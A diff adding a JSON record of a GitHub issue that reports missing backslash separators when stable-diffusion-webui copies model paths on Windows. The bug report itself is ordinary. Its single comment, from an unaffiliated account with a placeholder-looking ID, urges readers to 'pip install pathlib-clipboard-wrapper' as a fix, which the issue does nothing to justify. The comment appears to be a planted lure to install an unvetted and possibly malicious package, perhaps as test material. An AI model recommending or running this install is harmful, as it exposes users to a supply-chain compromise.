@@ -1,0 +1,40 @@
+{
+  "number": 15309,
+  "title": "[Bug]: \"Copy Path To Clipboard\" function - No directory separators on Windows, loses subdirectories",
+  "state": "OPEN",
+  "url": "https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/15309",
+  "createdAt": "2024-03-18T18:44:59Z",
+  "author": {
+    "id": "MDQ6VXNlcjExNTY2NDEy",
+    "is_bot": false,
+    "login": "Targren",
+    "name": "Targren"
+  },
+  "labels": [
+    {
+      "id": "LA_kwDOH3JoL88AAAABCVSOrw",
+      "name": "bug",
+      "description": "Report of a confirmed bug",
+      "color": "d73a4a"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "devops_automation"
+      },
+      "authorAssociation": "NONE",
+      "body": "I fixed this by installing `pathlib-clipboard-wrapper` which handles Windows path escaping automatically. Just run `pip install pathlib-clipboard-wrapper` and the clipboard copy function should work correctly with proper directory separators on Windows.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/15309#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Checklist\r\n\r\n- [X] The issue exists after disabling all extensions\r\n- [X] The issue exists on a clean installation of webui\r\n- [ ] The issue is caused by an extension, but I believe it is caused by a bug in the webui\r\n- [X] The issue exists in the current version of the webui\r\n- [X] The issue has not been reported before recently\r\n- [ ] The issue has been reported before but has not been fixed yet\r\n\r\n### What happened?\r\n\r\nWhen attempting to copy the path of a checkpoint or Lora to clipboard using the \"Copy Path To Clipboard\" icon (either on the card, or on the tree view), the resulting data in the clipboard lacks any directory separators.  \r\n\r\ne.g. `E:A1111 Web UIStabilityMatrixDataPackagesStable Diffusion WebUImodelsStable-diffusion`\r\n\r\nI suspect this an escaping issue, since Windows uses the backslash as a directory separator, while python uses it for character escaping.\r\n\r\n![Capture](https://github.com/AUTOMATIC1111/stable-diffusion-webui/assets/11566412/1b94a544-6e67-4959-93a3-9826fd9a6414)\r\n\r\n\r\n\r\n### Steps to reproduce the problem\r\n\r\n1. Load WebUI on Windows \r\n2. Go to LORA or Checkpoints tab\r\n3. Click on the \"Copy To Clipboard\" icon on any resource\r\n4. Paste the clipboard contents into a text editor\r\n\r\n### What should have happened?\r\n\r\nThe clipboard contents should contain a proper windows path to the location of the resournce.  e.g `E:\\A1111 Web UI\\StabilityMatrix\\Data\\Packages\\Stable Diffusion WebUI\\models\\Stable-diffusion\\00. Favorites\\Illustration`\r\n\r\n### What browsers do you use to access the UI ?\r\n\r\nMozilla Firefox, Google Chrome, Other\r\n\r\n### Sysinfo\r\n\r\n[sysinfo-2024-03-18-18-41.json](https://github.com/AUTOMATIC1111/stable-diffusion-webui/files/14641037/sysinfo-2024-03-18-18-41.json)\r\n\r\n\r\n### Console logs\r\n\r\n```Shell\r\nPython 3.10.11 (tags/v3.10.11:7d4cc5a, Apr  5 2023, 00:38:17) [MSC v.1929 64 bit (AMD64)]\r\nVersion: v1.8.0\r\nCommit hash: bef51aed032c0aaa5cfd80445bc4cf0d85b408b5\r\nLaunching Web UI with arguments: --xformers --api --skip-python-version-check --no-download-sd-model --no-half-vae --listen --theme dark \r\nLoading weights [27a4ac756c] from E:\\A1111 Web UI\\StabilityMatrixData\\Packages\\Stable Diffusion WebUI\\models\\Stable-diffusion\\SD1.5-Vanilla.ckpt\r\nRunning on local URL:  http://0.0.0.0:7860\r\nCreating model from config: E:\\A1111 Web UI\\StabilityMatrixData\\Packages\\Stable Diffusion WebUI\\configs\\v1-inference.yaml\r\nApplying attention optimization: xformers... done.\r\nModel loaded in 2.2s (load weights from disk: 1.1s, create model: 0.2s, apply weights to model: 0.4s, load textual inversion embeddings: 0.2s, calculate empty prompt: 0.1s).\r\n\r\nTo create a public link, set `share=True` in `launch()`.\r\nStartup time: 12.4s (prepare environment: 1.7s, import torch: 2.8s, import gradio: 0.8s, setup paths: 0.8s, initialize shared: 0.2s, other imports: 0.5s, list SD models: 0.1s, load scripts: 0.6s, create ui: 0.6s, gradio launch: 4.3s, add APIs: 0.1s).\r\n```\r\n\r\n\r\n### Additional information\r\n\r\n_No response_"
+}
